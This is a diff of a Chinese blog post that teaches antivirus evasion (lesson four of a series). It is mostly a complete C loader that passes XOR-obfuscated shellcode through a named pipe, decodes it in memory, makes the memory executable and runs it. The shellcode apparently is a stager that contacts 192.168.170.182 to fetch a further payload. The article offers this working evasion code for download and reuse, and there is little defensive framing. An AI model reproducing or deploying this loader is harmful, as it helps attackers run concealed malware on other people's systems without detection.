@@ -1,98 +1,106 @@
-<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>静态恶意代码逃逸（第四课） - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600;700&display=swap"><link rel=stylesheet href=/css/fontawesome.css></head><body><div class="container wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=post><div class=post-header><div class=meta><div class=date><span class=day>10</span>
-<span class=rest>Nov 2019</span></div></div><div class=matter><h1 class=title>静态恶意代码逃逸（第四课）</h1></div></div><h2 id=0x01-分离免杀>0x01 分离免杀</h2><p>前五课的代码将会上传至Github，方便读者下载研究 : <a href=https://github.com/Rvn0xsy/BadCode>https://github.com/Rvn0xsy/BadCode</a></p><p>分离免杀：将恶意代码放置在程序本身之外的一种加载方式。</p><p>前面三课主要围绕着程序本身的加载，后面的课程将围绕网络、数据共享的方式去展开</p><h2 id=0x02-管道>0x02 管道</h2><p>何为管道：管道是通过网络来完成进程间的通信，它屏蔽了底层的网络协议细节。</p><p>通常与Pipe相关的API都与管道有关，包括Cobaltstrike External C2也是用的管道进行进程通信，一般管道是一个公开的内核对象，所有进程都可以访问。</p><p>先展开本地管道来讲解：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">73
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">74
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">75
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">76
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">77
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">78
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">79
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">80
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">81
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">82
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">83
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">84
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">85
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">86
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">87
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">88
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">89
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">90
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">91
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">92
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">93
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;</span><span style=color:#75715e>
+<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=zh-cn dir=ltr><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>静态恶意代码逃逸（第四课） - 倾旋的博客</title><meta name=theme-color><meta name=description content='0x01 分离免杀
+前五课的代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
+分离免杀：将恶意代码放置在程序本身之外的一种加载方式。
+前面三课主要围绕着程序本身的加载，后面的课程将围绕网络、数据共享的方式去展开
+0x02 管道
+何为管道：管道是通过网络来完成进程间的通信，它屏蔽了底层的网络协议细节。
+通常与Pipe相关的API都与管道有关，包括Cobaltstrike External C2也是用的管道进行进程通信，一般管道是一个公开的内核对象，所有进程都可以访问。
+先展开本地管道来讲解：
+#include <Windows.h>
+#include <stdio.h>
+#include <intrin.h>
+
+#define BUFF_SIZE 1024
+char buf[] = "\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a";
+PTCHAR ptsPipeName = TEXT("\\\\.\\pipe\\BadCodeTest");
+
+BOOL RecvShellcode(VOID){
+    HANDLE hPipeClient;
+    DWORD dwWritten;
+    DWORD dwShellcodeSize = sizeof(buf);
+    // 等待管道可用
+    WaitNamedPipe(ptsPipeName,NMPWAIT_WAIT_FOREVER);
+    // 连接管道
+    hPipeClient = CreateFile(ptsPipeName,GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING ,FILE_ATTRIBUTE_NORMAL,NULL);
+
+    if(hPipeClient == INVALID_HANDLE_VALUE){
+        printf("[+]Can&#39;t Open Pipe , Error : %d \n",GetLastError());
+        return FALSE;
+    }
+
+    WriteFile(hPipeClient,buf,dwShellcodeSize,&amp;dwWritten,NULL);
+    if(dwWritten == dwShellcodeSize){
+        CloseHandle(hPipeClient);
+        printf("[+]Send Success ! Shellcode : %d Bytes\n",dwShellcodeSize);
+        return TRUE;
+    }
+    CloseHandle(hPipeClient);
+    return FALSE;
+}
+
+
+int wmain(int argc, TCHAR * argv[]){
+
+    HANDLE hPipe;
+    DWORD dwError;
+    CHAR szBuffer[BUFF_SIZE];
+    DWORD dwLen;
+    PCHAR pszShellcode = NULL;
+    DWORD dwOldProtect; // 内存页属性
+    HANDLE hThread;
+    DWORD dwThreadId;
+    // 参考：https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea
+    hPipe = CreateNamedPipe(
+        ptsPipeName,
+        PIPE_ACCESS_INBOUND,
+        PIPE_TYPE_BYTE| PIPE_WAIT,
+        PIPE_UNLIMITED_INSTANCES,
+        BUFF_SIZE,
+        BUFF_SIZE,
+        0,
+        NULL);
+
+    if(hPipe == INVALID_HANDLE_VALUE){
+        dwError = GetLastError();
+        printf("[-]Create Pipe Error : %d \n",dwError);
+        return dwError;
+    }
+
+    CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)RecvShellcode,NULL,NULL,NULL);
+
+    if(ConnectNamedPipe(hPipe,NULL) > 0){
+        printf("[+]Client Connected...\n");
+        ReadFile(hPipe,szBuffer,BUFF_SIZE,&amp;dwLen,NULL);
+        printf("[+]Get DATA Length : %d \n",dwLen);
+        // 申请内存页
+        pszShellcode = (PCHAR)VirtualAlloc(NULL,dwLen,MEM_COMMIT,PAGE_READWRITE);
+        // 拷贝内存
+        CopyMemory(pszShellcode,szBuffer,dwLen);
+
+        for(DWORD i = 0;i< dwLen; i++){
+            Sleep(50);
+            _InterlockedXor8(pszShellcode+i,10);
+        }
+
+        // 这里开始更改它的属性为可执行
+        VirtualProtect(pszShellcode,dwLen,PAGE_EXECUTE,&amp;dwOldProtect);
+        // 执行Shellcode
+        hThread = CreateThread(
+            NULL, // 安全描述符
+            NULL, // 栈的大小
+            (LPTHREAD_START_ROUTINE)pszShellcode, // 函数
+            NULL, // 参数
+            NULL, // 线程标志
+            &amp;dwThreadId // 线程ID
+        );
+
+        WaitForSingleObject(hThread,INFINITE);
+    }
+
+    return 0;
+}
+本实例主要是通过一个线程函数充当一个管道客户端，使用管道客户端连接管道，发送Shellcode，然后由管道服务端接收，并反混淆，运行木马线程。'><meta name=author content="倾旋的博客"><link rel="preload stylesheet" as=style href=https://payloads.online/main.min.css><link rel=preload as=image href=https://payloads.online/theme.png><link rel=preload as=image href=/avatar.jpeg><script defer src=https://payloads.online/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://payloads.online/favicon.ico><link rel=apple-touch-icon href=https://payloads.online/apple-touch-icon.png><meta name=generator content="Hugo 0.148.2"><meta itemprop=name content="静态恶意代码逃逸（第四课）"><meta itemprop=description content="来来回回就会这么一点东西，不想一直停留在一个点上了，准备总结一下，往深的走。"><meta itemprop=datePublished content="2019-11-10T00:00:00+00:00"><meta itemprop=dateModified content="2019-11-10T00:00:00+00:00"><meta itemprop=wordCount content="202"><meta property="og:url" content="https://payloads.online/archivers/2019-11-10/4/"><meta property="og:site_name" content="倾旋的博客"><meta property="og:title" content="静态恶意代码逃逸（第四课）"><meta property="og:description" content="来来回回就会这么一点东西，不想一直停留在一个点上了，准备总结一下，往深的走。"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-11-10T00:00:00+00:00"><meta property="article:modified_time" content="2019-11-10T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="静态恶意代码逃逸（第四课）"><meta name=twitter:description content="来来回回就会这么一点东西，不想一直停留在一个点上了，准备总结一下，往深的走。"><link rel=canonical href=https://payloads.online/archivers/2019-11-10/4/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://payloads.online/>倾旋的博客</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse"><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/>首页</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/posts/>文章列表</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/tags>标签</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/projects>开源项目</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/about>关于我</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/links/>友情链接</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/message>留言</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/sponsor>赞助</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">静态恶意代码逃逸（第四课）</h1><div class="text-xs antialiased opacity-60"><time>Nov 10, 2019</time><span class=mx-1>&#183;</span>
